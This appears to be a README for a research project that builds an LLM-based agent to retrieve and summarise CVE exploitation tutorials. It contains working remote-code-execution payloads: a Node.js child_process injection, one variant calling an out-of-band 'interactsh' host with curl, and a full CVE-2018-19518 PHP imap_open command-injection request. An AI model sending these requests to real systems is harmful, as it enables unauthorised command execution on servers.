# README

## 任务描述

现在已经完成了payload的提取，对每个HTTP request，从中提取到payload行

```HTTP
POST /checkValid HTTP/1.1
Host: your-ip
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Basic YWRtaW46cGFzcw==
Content-Type: application/x-www-form-urlencoded
Content-Length: 124

document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("touch /tmp/success")
```

```json
{
  "payloads": [
    "POST /checkValid HTTP/1.1",
    "document=this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"curl <interactsh-url>\")",
  
  ]
}
```

现在在做搜索代理，workflow如下：

1. nmap检查服务版本
2. 将**服务版本+CVE+README+exploitation example**作为关键词进行网页检索
3. 大模型**过滤+总结**并输出检索结果:

## CVE Exploitation Tutorial

CVE-2018-19518 is a remote command execution vulnerability in PHP's IMAP extension, specifically exploiting the `imap_open` function. Attackers can execute arbitrary commands via specially crafted IMAP commands. Below is the exploitation method:

### Exploitation Steps:

1. **Craft a Malicious IMAP Command**: The vulnerability allows attackers to inject commands via the `hostname` parameter in the `imap_open` function. The `hostname` parameter is manipulated to include a command injection payload.
2. **Send a Malicious HTTP Request**: The following HTTP POST request can be used to exploit the vulnerability. The payload is base64-encoded to bypass potential filtering:

   ```http

   POST / HTTP/1.1

   Host: your-ip

   Accept-Encoding: gzip, deflate

   Accept: */*

   Accept-Language: en

   User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)

   Connection: close

   Content-Type: application/x-www-form-urlencoded

   Content-Length: 125


   hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}&username=111&password=222

   ```

   - The payload decodes to `echo '1234567890'>/tmp/test0001`, which creates a file `/tmp/test0001` with the content `1234567890`.
3. **Verify Exploitation**: After sending the request, verify the command execution by checking if the file `/tmp/test0001` exists on the target system.

### Notes:

- The vulnerability arises because the `imap_open` function in PHP's IMAP extension calls `rsh` (or `ssh` in Debian/Ubuntu systems) to connect to remote shells. The `-oProxyCommand` parameter in `ssh` allows command injection.
- This exploit requires the target system to have the IMAP extension enabled and the `imap_open` function exposed to user input.

## Reference Links

- [GitHub - vulhub/CVE-2018-19518](https://github.com/vulhub/vulhub/blob/master/php/CVE-2018-19518/README.md)
- [PHP Bug Report #77153](https://bugs.php.net/bug.php?id=77153)
- [Exploit Repository](https://github.com/Bo0oM/PHP_imap_open_exploit)

## 遇到的问题

- 检索到的网页不一定包含渗透教程，可能只是对cve漏洞的基本描述
- 模型总结的prompt还需要优化，包括对OCR的提示词，输出结构化及优化，还要人工检查其它检索结果里是否有被我调的exploitation example
